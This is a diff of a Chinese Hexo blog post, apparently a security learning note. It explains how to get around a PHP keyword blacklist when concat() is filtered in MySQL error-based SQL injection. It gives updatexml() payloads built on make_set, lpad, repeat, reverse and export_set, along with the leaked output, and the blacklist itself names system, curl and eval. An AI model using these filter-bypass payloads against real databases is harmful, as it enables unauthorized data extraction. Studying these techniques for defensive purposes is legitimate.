@@ -1,5 +1,68 @@
-<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><title>当concat()在报错注入不可用时</title><link rel="shortcut icon" href="/images/avatar.png"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css"><script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script></head><body><nav class="main-nav"><a href="/">Home</a><a href="/archives">Archives</a></nav><div class="profile"><section id="wrapper"><header id="header"><a href="/about"><img class="2x" id="avatar" src="/images/avatar.png"></a><h1>The clown is laughing at you</h1><h2></h2></header></section></div><section class="post" id="wrapper"><article><header><h1>当concat()在报错注入不可用时</h1><h2 class="headline">Apr 01, 2019 7:12·585 words
-·2 minutes read<span class="tags"></span></h2></header><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01"><span class="toc-text">0x01</span></a></li></ol></div><section id="post-body"><p>当concat()在报错注入不可用时</p>
+<!DOCTYPE html>
+<html lang=>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="root">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <title>当concat()在报错注入不可用时 | The clown is laughing at you</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <span>The clown is laughing at you</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content markdown-body">
+          <h1>当concat()在报错注入不可用时</h1>
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/04/01</time>
+            
+            
+          </div>
+          <p>当concat()在报错注入不可用时</p>
 <h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>这里有这么一段代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//cpnfig.php</span></span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$password = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"day1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">	$pattern = <span class="string">"insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval"</span>;</span><br><span class="line">	$back_list = explode(<span class="string">"|"</span>,$pattern);</span><br><span class="line">	<span class="keyword">foreach</span>($back_list <span class="keyword">as</span> $hack)&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"/$hack/i"</span>, $value))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"$hack detected!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>很明显，这里是一个黑名单过滤，将绝大多数的注入关键词过滤掉了，sqlmap无解下，报错注入时，发现concat()，会被过滤掉。</p>
 <p>报错注入有两种：</p>
@@ -17,4 +80,165 @@
 <p>所以结合make_set()函数，我们在concat()不可用的情况下，可以这么做<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">'~'</span>,(select database())),<span class="number">1</span>);            </span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'~,day1'</span></span><br></pre></td></tr></table></figure></p>
 <p>然后使用其他类似函数也是一样的效果，不过就是记得加上特殊字符，防止数据遗漏，其实我觉得以防万一还是都加上特殊符号吧<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,lpad(<span class="string">'@'</span>,<span class="number">30</span>,(select user())),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'@localhostroot@localhostr@'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,repeat((select user()),<span class="number">2</span>),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'@localhostroot@localhost'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,(select user()),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'@localhost'</span></span><br><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,reverse((select user())),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'@toor'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(<span class="number">1</span>,export_set(<span class="number">1</span>|<span class="number">2</span>,<span class="string">'::'</span>,(select user())),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">'::,::,root@localhost,root@localh'</span></span><br></pre></td></tr></table></figure></p>
 <p>小结：很小的知识点，但是学到很多.</p>
-</section><nav id="post-nav"><span class="prev"><a href="/2019/04/02/sql注入奇巧淫技/"><span class="arrow">←</span>Newer Posts</a></span><span class="next"><a href="/2019/03/30/依葫芦画瓢之in-array函数缺陷/">Older Posts<span class="arrow">→</span></a></span></nav></article></section><footer id="footer"><div id="social"><a class="symbol" href="https://github.com/fuzhouxxdong"><i class="fa fa-github"></i></a></div><p class="small">© Copyright 2018 &nbsp;<i class="fa fa-heart" aria-hidden="true">&nbsp;Dxx</i></p><p class="small">Powered by &nbsp;<a href="https://hexo.io/">Hexo &nbsp;</a>Theme By &nbsp;<a href="https://github.com/fuzhouxxdong/hexo-theme-dxx">Dxx</a></p></footer><script>hljs.initHighlightingOnLoad();</script></body></html>
+
+        </section>
+    </article>
+    
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+            <div id="disqus_thread" class="disqus-thread">
+              <i>Loading comments box needs to over the wall</i>
+            </div>
+        </div>
+        <!-- disqus 评论框 end -->
+    
+    
+        <!-- livere 评论框 start -->
+        <div class="comment">
+            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
+        </div>
+        <!-- livere 评论框 end -->
+        
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01"><span class="toc-number">1.</span> <span class="toc-text">0x01</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<!-- disqus 公共JS代码 -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "your_disqus_shortname";
+  var disqus_identifier = "http://yoursite.com/2019/04/01/当concat-在报错注入不可用时/";
+  var disqus_url = "http://yoursite.com/2019/04/01/当concat-在报错注入不可用时/";
+
+  isAgent(getDisqus)
+
+  // determine user agent in China
+  function isAgent(cb) {
+    var url = '//graph.facebook.com/feed?callback=h';
+    var xhr = new XMLHttpRequest();
+    var called = false;
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(true);
+      }
+    };
+    xhr.send();
+    // timeout 1s, this facebook API is very fast.
+    setTimeout(function() {
+      if (!called) {
+      xhr.abort();
+      cb(false)
+      }
+    }, 1000);
+  }
+
+  function getDisqus(isAgent) {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
+    dsq.async = true
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+  }
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+<script type="text/javascript">
+  (function(d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+
+      if (typeof LivereTower === 'function') { return; }
+
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+
+      e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-xuexiaoban"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
